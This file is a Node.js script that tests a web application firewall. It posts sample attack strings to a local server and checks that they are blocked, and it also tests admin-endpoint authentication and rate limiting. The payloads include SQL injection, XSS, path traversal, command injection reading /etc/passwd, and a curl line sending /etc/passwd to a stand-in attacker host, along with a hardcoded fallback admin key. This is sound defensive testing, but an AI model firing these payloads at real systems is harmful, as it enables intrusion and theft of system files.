#!/usr/bin/env node
/**
 * WAF Testing Script
 * Tests the WAF functionality with various attack patterns
 */

const axios = require('axios');
const colors = require('colors');

const BASE_URL = process.env.TEST_URL || 'http://localhost:3000';
const ADMIN_API_KEY = process.env.ADMIN_API_KEY || 'admin_test_key_12345';

// Test patterns
const testPatterns = {
  free: [
    {
      name: 'Basic SQL Injection',
      pattern: "' OR 1=1 --",
      expected: 'blocked'
    },
    {
      name: 'XSS Script Tag',
      pattern: "<script>alert('xss')</script>",
      expected: 'blocked'
    },
    {
      name: 'Path Traversal',
      pattern: '../../../etc/passwd',
      expected: 'blocked'
    },
    {
      name: 'Command Injection',
      pattern: '$(cat /etc/passwd)',
      expected: 'blocked'
    }
  ],
  premium: [
    {
      name: 'Advanced SQL Injection with UNION',
      pattern: "UNION SELECT password FROM users WHERE '1'='1",
      expected: 'blocked'
    },
    {
      name: 'SQL Timing Attack',
      pattern: 'BENCHMARK(5000000,MD5(1))',
      expected: 'blocked'
    },
    {
      name: 'Advanced XSS via iframe',
      pattern: '<iframe src="javascript:alert(\'xss\')"></iframe>',
      expected: 'blocked'
    },
    {
      name: 'Command Injection with Network Tools',
      pattern: 'curl -d @/etc/passwd attacker.com',
      expected: 'blocked'
    }
  ]
};

class WAFTester {
  constructor() {
    this.results = [];
    this.stats = { passed: 0, failed: 0, errors: 0 };
  }

  async test() {
    console.log('🛡️  WAF Security Testing Suite\n'.bold.cyan);
    
    try {
      // Test server status
      await this.testServerStatus();
      
      // Test both modes
      await this.testMode('free');
      await this.testMode('premium');
      
      // Test admin endpoints
      await this.testAdminEndpoints();
      
      // Test rate limiting
      await this.testRateLimiting();
      
      this.printSummary();
      
    } catch (error) {
      console.error('❌ Testing failed:'.red, error.message);
    }
  }

  async testServerStatus() {
    console.log('📡 Testing server status...'.yellow);
    
    try {
      const response = await axios.get(`${BASE_URL}/health`);
      console.log('✅ Server is running'.green);
      console.log(`   Status: ${response.data.status}`);
      console.log(`   Security warnings: ${response.data.security.warnings.length}`);
    } catch (error) {
      throw new Error(`Server not accessible: ${error.message}`);
    }
  }

  async testMode(mode) {
    console.log(`\n🔧 Testing ${mode.toUpperCase()} mode...`.bold.blue);
    
    // Switch to mode
    await this.switchMode(mode);
    
    // Test patterns available in this mode
    const patterns = mode === 'premium' 
      ? [...testPatterns.free, ...testPatterns.premium]
      : testPatterns.free;
    
    for (const test of patterns) {
      await this.runTest(test, mode);
    }
  }

  async switchMode(mode) {
    try {
      await axios.post(`${BASE_URL}/api/admin/security/mode`, 
        { mode },
        { headers: { 'X-Admin-API-Key': ADMIN_API_KEY } }
      );
      console.log(`   Switched to ${mode} mode`.green);
    } catch (error) {
      console.log(`   ⚠️  Could not switch to ${mode} mode: ${error.response?.data?.error || error.message}`.yellow);
    }
  }

  async runTest(test, mode) {
    try {
      console.log(`   Testing: ${test.name}`.gray);
      
      // Send malicious request
      const response = await axios.post(`${BASE_URL}/test`, {
        maliciousInput: test.pattern,
        test: true
      }, {
        timeout: 5000,
        validateStatus: () => true // Accept any status code
      });
      
      const blocked = response.status === 403;
      const passed = blocked === (test.expected === 'blocked');
      
      if (passed) {
        console.log(`      ✅ ${blocked ? 'Blocked' : 'Allowed'} (as expected)`.green);
        this.stats.passed++;
      } else {
        console.log(`      ❌ ${blocked ? 'Blocked' : 'Allowed'} (expected ${test.expected})`.red);
        this.stats.failed++;
      }
      
      this.results.push({
        mode,
        test: test.name,
        pattern: test.pattern,
        expected: test.expected,
        actual: blocked ? 'blocked' : 'allowed',
        passed
      });
      
    } catch (error) {
      console.log(`      ⚠️  Error: ${error.message}`.yellow);
      this.stats.errors++;
    }
  }

  async testAdminEndpoints() {
    console.log('\n🔐 Testing admin endpoints...'.bold.blue);
    
    const endpoints = [
      { method: 'GET', path: '/api/admin/security/config', name: 'Get Config' },
      { method: 'GET', path: '/api/admin/security/stats', name: 'Get Stats' },
      { method: 'GET', path: '/api/admin/security/health', name: 'Security Health' },
      { method: 'GET', path: '/api/admin/security/test', name: 'Test Patterns' }
    ];
    
    for (const endpoint of endpoints) {
      await this.testAdminEndpoint(endpoint);
    }
  }

  async testAdminEndpoint(endpoint) {
    try {
      console.log(`   Testing: ${endpoint.name}`.gray);
      
      // Test without auth
      const unauthorizedResponse = await axios({
        method: endpoint.method.toLowerCase(),
        url: `${BASE_URL}${endpoint.path}`,
        validateStatus: () => true
      });
      
      if (unauthorizedResponse.status === 401 || unauthorizedResponse.status === 403) {
        console.log(`      ✅ Unauthorized access blocked`.green);
      } else {
        console.log(`      ❌ Unauthorized access allowed`.red);
      }
      
      // Test with auth
      const authorizedResponse = await axios({
        method: endpoint.method.toLowerCase(),
        url: `${BASE_URL}${endpoint.path}`,
        headers: { 'X-Admin-API-Key': ADMIN_API_KEY },
        validateStatus: () => true
      });
      
      if (authorizedResponse.status === 200) {
        console.log(`      ✅ Authorized access successful`.green);
      } else {
        console.log(`      ❌ Authorized access failed: ${authorizedResponse.status}`.red);
      }
      
    } catch (error) {
      console.log(`      ⚠️  Error: ${error.message}`.yellow);
    }
  }

  async testRateLimiting() {
    console.log('\n⏱️  Testing rate limiting...'.bold.blue);
    
    try {
      const requests = [];
      const requestCount = 10;
      
      // Send multiple requests quickly
      for (let i = 0; i < requestCount; i++) {
        requests.push(
          axios.get(`${BASE_URL}/health`, { validateStatus: () => true })
        );
      }
      
      const responses = await Promise.all(requests);
      const rateLimited = responses.some(r => r.status === 429);
      
      if (rateLimited) {
        console.log('   ✅ Rate limiting is working'.green);
      } else {
        console.log('   ⚠️  Rate limiting may not be active (or limit is high)'.yellow);
      }
      
    } catch (error) {
      console.log(`   ⚠️  Rate limiting test error: ${error.message}`.yellow);
    }
  }

  printSummary() {
    console.log('\n📊 Test Summary'.bold.cyan);
    console.log('='.repeat(50));
    console.log(`✅ Passed: ${this.stats.passed}`.green);
    console.log(`❌ Failed: ${this.stats.failed}`.red);
    console.log(`⚠️  Errors: ${this.stats.errors}`.yellow);
    console.log(`📊 Total: ${this.stats.passed + this.stats.failed + this.stats.errors}`);
    
    const successRate = this.stats.passed / (this.stats.passed + this.stats.failed) * 100;
    console.log(`🎯 Success Rate: ${successRate.toFixed(1)}%`);
    
    if (this.stats.failed > 0) {
      console.log('\n❌ Failed Tests:'.red);
      this.results
        .filter(r => !r.passed)
        .forEach(r => {
          console.log(`   ${r.mode}/${r.test}: expected ${r.expected}, got ${r.actual}`);
        });
    }
    
    console.log('\n🎉 Testing completed!\n'.bold.green);
  }
}

// Run tests
if (require.main === module) {
  const tester = new WAFTester();
  tester.test().catch(console.error);
}

module.exports = WAFTester;
